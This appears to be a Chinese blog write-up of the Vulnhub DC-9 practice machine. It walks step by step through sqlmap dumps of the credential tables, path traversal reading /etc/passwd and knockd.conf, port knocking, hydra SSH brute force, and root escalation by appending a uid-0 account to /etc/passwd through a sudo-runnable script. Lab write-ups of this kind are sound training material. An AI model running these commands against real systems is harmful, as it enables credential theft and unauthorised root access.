---
layout: mypost
title: Vulnhub靶机DC9渗透
categories: [靶机]
---

靶机下载地址：[DC9](https://www.vulnhub.com/entry/dc-9,412/)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/04/30/gAkSfA.png)

DC9 地址：192.168.43.128

根据下面爆出的多密码，增加 -O -sA 探测

![](https://z3.ax1x.com/2021/04/30/gAkETg.png)

很可能是使用了 knockd 保护了 ssh 端口

访问 web 页面

![](https://z3.ax1x.com/2021/04/30/gAkZkQ.png)

![](https://z3.ax1x.com/2021/04/30/gAkeYj.png)

![](https://z3.ax1x.com/2021/04/30/gAkupn.png)

居然看见川宝，作者恶趣味哈哈哈

![](https://z3.ax1x.com/2021/04/30/gAkKlq.png)

没有回显，盲猜一个 post sql 注入

![](https://z3.ax1x.com/2021/04/30/gAk30U.png)

确认

爆库

```bash
sqlmap -u http://192.168.43.128/results.php --dbs --data "search=1" --batch  
```

![](https://z3.ax1x.com/2021/04/30/gAkth9.png)

爆 Staff 的表

```bash
sqlmap -u http://192.168.43.128/results.php --dbs --data "search=1" -D 'Staff' --tables --batch
```

![](https://z3.ax1x.com/2021/04/30/gAka11.png)

爆  Users 的字段

```bash
sqlmap -u http://192.168.43.128/results.php --dbs --data "search=1" -D 'Staff' -T 'Users' --columns --batch
```

![](https://z3.ax1x.com/2021/04/30/gAkD0O.png)

爆 Username、Password 的值

```bash
sqlmap -u http://192.168.43.128/results.php --dbs --data "search=1" -D 'Staff' -T 'Users' -C 'Username,Password' --dump --batch
```

![](https://z3.ax1x.com/2021/04/30/gAkr7D.png)

得到 admin 的密码 856f5de590ef37314e7c3bdf6f8a66dc

去掉 --batch 参数，sqlmap 默认字典破解 hash

![](https://z3.ax1x.com/2021/04/30/gAk29A.png)

解密得到 transorbital1

![](https://z3.ax1x.com/2021/04/30/gAkWct.png)

footer 处 File does not exist 很显眼，疑似文件包含

```url
http://192.168.43.128/welcome.php?file=../../../../../../../etc/passwd
```

![](https://z3.ax1x.com/2021/04/30/gAk4nf.png)

确认

看看 knockd 配置

```url
http://192.168.43.128/manage.php?file=../../../../etc/knockd.conf
```

![](https://z3.ax1x.com/2021/04/30/gAkTAg.png)

安装 knockd 工具，使用序列号 knock 靶机

```bash
sudo apt-get install knockd 
knock 192.168.43.128 7469 8475 9842 
```

![](https://z3.ax1x.com/2021/04/30/gAkq9s.png)

打开 ssh 端口

爆 users 的表

```bash
sqlmap -u http://192.168.43.128/results.php --dbs --data "search=1" -D 'users' --tables --batch
```

![](https://z3.ax1x.com/2021/04/30/gAkL3n.png)

爆 UserDetails 的字段

```bash
sqlmap -u http://192.168.43.128/results.php --dbs --data "search=1" -D 'users' -T 'UserDetails' --columns --batch
```

![](https://z3.ax1x.com/2021/04/30/gAkOcq.png)

爆 username、password 的值

```bash
sqlmap -u http://192.168.43.128/results.php --dbs --data "search=1" -D 'users' -T 'UserDetails' -C 'username,password' --dump --batch
```

![](https://z3.ax1x.com/2021/04/30/gAkvuV.png)

写入字典，上 hydra 爆破

```bash
hydra -L user.txt -P pass.txt ssh://192.168.43.128
```

![](https://z3.ax1x.com/2021/04/30/gAkxBT.png)

得到 handlerb 的密码 UrAG0D!

得到 joeyt 的密码 Passw0rd

得到 janitor 的密码 Ilovepeepee

看了一圈只有 janitor 权限比较特殊

![](https://z3.ax1x.com/2021/04/30/gAkzHU.png)

![](https://z3.ax1x.com/2021/04/30/gAA9N4.png)

新密码写入字典梅开二度

![](https://z3.ax1x.com/2021/04/30/gAAiC9.png)

得到 fredf 的密码 B4-Tru3-001

ls -la 、find、echo $path、一圈下来还是 sudo -l 有所发现

![](https://z3.ax1x.com/2021/04/30/gAAkg1.png)

看看 test 文件

![](https://z3.ax1x.com/2021/04/30/gAAAjx.png)

![](https://z3.ax1x.com/2021/04/30/gAAZDK.png)

目标找 python 脚本

```bash
find / -name test.py -print 2>/dev/null
```

![](https://z3.ax1x.com/2021/04/30/gAAnED.png)

很明显第一条就是目标

![](https://z3.ax1x.com/2021/04/30/gAAK4H.png)

通过这个程序可以以 root 权限合并文件内容，将用户写入 /etc/passwd

可用 perl 

```bash
perl -le 'print crypt("seeyou","salt")'
saTJzXLNF8mC
echo "Stan:saTJzXLNF8mC.:0:0:User_like_root:/root:/bin/bash" >> /tmp/passwd
sudo ./test /tmp/passwd /etc/passwd
su Stan
see you
```

> 用户名：密码hash：uid：gid：说明：家目录：登陆后使用的shell

![](https://z3.ax1x.com/2021/04/30/gAAQCd.png)

Pwned！

还可以用 openssl

```bash
openssl passwd -1 -salt Stan seeyou
$1$Stan$zBGFIWmMFhWMbK24LpSWR0
echo "Stan:$1$Stan$zBGFIWmMFhWMbK24LpSWR0:0:0:root:/bin/bash">> /tmp/Stan
sudo ./test /tmp/Stan /etc/passwd
su Stan
```

或者在 /tmp 下创建 shell.txt，写入 fredf  ALL=(ALL:ALL) ALL

```bash
sudo ./opt/devstuff/dist/test/test shell.txt /etc/sudoers
sudo su
```

